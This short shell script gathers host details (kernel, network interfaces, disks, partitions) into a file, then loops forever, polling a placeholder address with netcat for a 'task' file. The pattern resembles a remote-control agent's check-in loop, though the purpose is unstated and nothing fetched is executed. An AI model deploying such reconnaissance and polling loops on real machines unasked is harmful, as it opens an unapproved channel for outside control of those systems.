#!/bin/sh
{ uname -a; ip address show; lsblk; fdisk -l; } > /tmp/inventory
while true; do
 nc 192.0.2.1 1234 > /tmp/task
 sleep 5
done
